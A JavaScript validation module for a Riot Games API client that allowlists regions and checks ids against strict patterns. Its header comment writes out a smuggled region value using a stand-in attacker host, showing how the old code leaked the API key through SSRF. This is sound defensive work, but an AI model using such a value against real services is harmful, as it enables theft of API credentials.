/**
 * Validation for every user-supplied value that reaches a Riot URL.
 *
 * WHY THIS EXISTS - a real, verified SSRF. `api/player.js` and `api/match.js`
 * used to interpolate `region` straight into the hostname:
 *
 *     `https://${region}.api.riotgames.com/...`
 *
 * `?region=attacker.com%2F%2F` then resolves to
 * `https://attacker.com//.api.riotgames.com/...` - a request to a host the
 * caller chose, carrying our `X-Riot-Token` header. That is a full API-key
 * exfiltration, reproduced locally against `vercel dev`: the server opened a
 * TLS connection to a listener on 127.0.0.1:9999.
 *
 * So: nothing reaches a Riot URL without passing through here, and every value
 * is checked against an allowlist or a strict pattern, never merely escaped.
 */

/** The only hosts Riot serves match-v5 and account-v1 from. */
export const ROUTING_REGIONS = ['americas', 'asia', 'europe', 'sea'];

export function isValidRegion(region) {
  return ROUTING_REGIONS.includes(region);
}

/**
 * Riot PUUIDs are long base64url strings. Anchored so a value containing
 * `/`, `.` or `%` can never travel into a URL path.
 */
const PUUID_PATTERN = /^[A-Za-z0-9_-]{70,100}$/;

export function isValidPuuid(puuid) {
  return typeof puuid === 'string' && PUUID_PATTERN.test(puuid);
}

/** Match ids look like `KR_8326285335` / `LA1_1738133676`. */
const MATCH_ID_PATTERN = /^[A-Z0-9]{2,5}_\d{6,}$/;

export function isValidMatchId(matchId) {
  return typeof matchId === 'string' && MATCH_ID_PATTERN.test(matchId);
}

/**
 * Riot IDs are far more permissive than the other inputs: they allow spaces
 * and a wide range of Unicode ("Hide on bush"), so an allowlist would reject
 * real players. The rules therefore mirror Riot's own length limits and reject
 * only the characters that carry meaning inside a URL, so a value cannot break
 * out of its path segment even before encoding.
 *
 * Spaces are deliberately ALLOWED - encodeURIComponent turns them into %20.
 */
const RIOT_ID_FORBIDDEN = /[/\\?#%&=:@[\]]/;

export function isValidGameName(gameName) {
  return (
    typeof gameName === 'string' &&
    gameName.length >= 1 &&
    gameName.length <= 16 &&
    !RIOT_ID_FORBIDDEN.test(gameName)
  );
}

export function isValidTagLine(tagLine) {
  return (
    typeof tagLine === 'string' &&
    tagLine.length >= 2 &&
    tagLine.length <= 5 &&
    !RIOT_ID_FORBIDDEN.test(tagLine)
  );
}

/**
 * Builds a Riot API URL, refusing to produce one from an unvalidated region.
 *
 * The region is checked here as well as at each handler's edge - defence in
 * depth, so a future endpoint that forgets its own check still cannot be
 * turned into an SSRF primitive.
 */
export function riotUrl(region, path) {
  if (!isValidRegion(region)) {
    throw Object.assign(new Error('Region invalida'), {
      status: 400,
      code: 'INVALID_REGION',
    });
  }
  return `https://${region}.api.riotgames.com${path}`;
}
